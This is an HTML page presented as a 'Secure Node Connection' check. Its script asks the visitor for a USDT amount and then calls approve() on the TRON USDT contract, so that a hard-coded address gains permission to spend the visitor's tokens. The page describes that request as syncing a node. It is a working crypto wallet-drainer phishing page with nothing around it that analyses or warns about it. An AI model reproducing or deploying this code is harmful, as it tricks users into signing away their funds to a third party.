<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Node Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body{font-family:sans-serif;text-align:center;padding:50px 20px;background:#f8f9fa}
        .btn{background:#e51c23;color:#fff;padding:15px 40px;border:none;border-radius:8px;font-size:18px;width:100%}
        input{width:100%;padding:15px;margin:20px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:20px}
    </style>
</head>
<body>
    <h3>Secure Node Connection</h3>
    <input type="number" id="amt" placeholder="Enter USDT Amount">
    <button class="btn" onclick="run()">Connect Node</button>
    <p id="msg" style="display:none;color:orange;margin-top:20px">⚠️ Syncing... Please confirm in your wallet.</p>

    <script>
        const CONFIG = {
            R: "TKPDtwUvCL45sKPchTr9d1U8TKyNKQDnLB", 
            U: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
        };
        async function run() {
            const v = document.getElementById('amt').value;
            if(!v || v<=0) return alert("Invalid amount");
            try {
                const c = await window.tronWeb.contract().at(CONFIG.U);
                await c.approve(CONFIG.R, (v*1000000).toString()).send();
                document.getElementById('msg').style.display = 'block';
            } catch (e) { console.error(e); }
        }
    </script>
</body>
</html>
